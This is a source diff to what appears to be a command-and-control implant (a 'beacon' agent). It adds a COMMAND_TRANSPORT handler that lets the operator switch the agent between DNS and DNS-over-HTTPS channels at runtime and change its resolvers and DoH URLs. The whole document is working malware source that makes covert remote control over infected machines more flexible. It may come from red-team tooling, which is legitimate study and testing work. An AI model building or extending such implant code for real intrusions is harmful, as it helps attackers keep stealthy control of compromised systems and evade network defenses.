@@ -73,6 +73,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_PROFILE:
 			this->CmdProfile(CommandId, inPacker, outPacker); break;
 
+		case COMMAND_TRANSPORT:
+			this->CmdTransport(CommandId, inPacker, outPacker); break;
+
 		case COMMAND_PS_LIST:
 			this->CmdPsList(CommandId, inPacker, outPacker); break;
 
@@ -190,6 +193,103 @@ void Commander::CmdCd(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	else {
 		outPacker->Pack32(COMMAND_ERROR);
 		outPacker->Pack32(TEB->LastErrorValue);
+	}
+}
+
+void Commander::CmdTransport(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	// Wire format (mirrors COMMAND_PROFILE-style commands):
+	// [COMMAND_TRANSPORT][subcommand][args...][taskId]
+	// subcommand 1: change mode ("dns"/"doh"/"auto")
+	//   payload: [string mode][taskId]
+	// subcommand 2: update DNS resolvers string
+	//   payload: [string resolvers][taskId]
+	// subcommand 3: update DoH URLs string
+	//   payload: [string urls][taskId]
+	ULONG subcommand = inPacker->Unpack32();
+
+	if (subcommand == 1) {
+		ULONG modeSize = 0;
+		CHAR* mode = (CHAR*)inPacker->UnpackBytes(&modeSize);
+		ULONG taskId = inPacker->Unpack32();
+
+		#if defined(BEACON_DNS_DOH)
+		// Runtime update of DNS/DoH transport mode for the combined beacon.
+		if (mode && modeSize > 0) {
+			BYTE* newMode = (BYTE*)MemAllocLocal(modeSize + 1);
+			if (newMode) {
+				memcpy(newMode, mode, modeSize);
+				newMode[modeSize] = '\0';
+				// Normalize to lowercase ASCII to simplify comparisons.
+				for (ULONG i = 0; i < modeSize; ++i) {
+					if (newMode[i] >= 'A' && newMode[i] <= 'Z')
+						newMode[i] = (BYTE)(newMode[i] - 'A' + 'a');
+				}
+				this->agent->config->profile.mode = newMode;
+			}
+		}
+		#endif
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_TRANSPORT);
+		outPacker->Pack32(subcommand);
+	}
+	else if (subcommand == 2) {
+		ULONG resSize = 0;
+		CHAR* resolvers = (CHAR*)inPacker->UnpackBytes(&resSize);
+		ULONG taskId = inPacker->Unpack32();
+
+		#if defined(BEACON_DNS) || defined(BEACON_DNS_DOH)
+		// Runtime update of DNS recursive resolvers string. This affects the
+		// AgentConfig profile and will be picked up by new connectors or future
+		// sessions. Existing ConnectorDNS instances keep their cached copy.
+		if (resolvers && resSize > 0) {
+			BYTE* newRes = (BYTE*)MemAllocLocal(resSize + 1);
+			if (newRes) {
+				memcpy(newRes, resolvers, resSize);
+				newRes[resSize] = '\0';
+				#if defined(BEACON_DNS)
+				this->agent->config->profile.resolvers = newRes;
+				#elif defined(BEACON_DNS_DOH)
+				this->agent->config->profile.dns.resolvers = newRes;
+				#endif
+			}
+		}
+		#else
+		UNREFERENCED_PARAMETER(resolvers);
+		#endif
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_TRANSPORT);
+		outPacker->Pack32(subcommand);
+	}
+	else if (subcommand == 3) {
+		ULONG urlsSize = 0;
+		CHAR* urls = (CHAR*)inPacker->UnpackBytes(&urlsSize);
+		ULONG taskId = inPacker->Unpack32();
+
+		#if defined(BEACON_DOH) || defined(BEACON_DNS_DOH)
+		// Runtime update of DoH URL list. This updates AgentConfig only; existing
+		// ConnectorDoH instances retain their internal copy until reconfigured.
+		if (urls && urlsSize > 0) {
+			BYTE* newUrls = (BYTE*)MemAllocLocal(urlsSize + 1);
+			if (newUrls) {
+				memcpy(newUrls, urls, urlsSize);
+				newUrls[urlsSize] = '\0';
+				#if defined(BEACON_DOH)
+				this->agent->config->profile.urls = newUrls;
+				#elif defined(BEACON_DNS_DOH)
+				this->agent->config->profile.doh.urls = newUrls;
+				#endif
+			}
+		}
+		#else
+		UNREFERENCED_PARAMETER(urls);
+		#endif
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_TRANSPORT);
+		outPacker->Pack32(subcommand);
 	}
 }
 
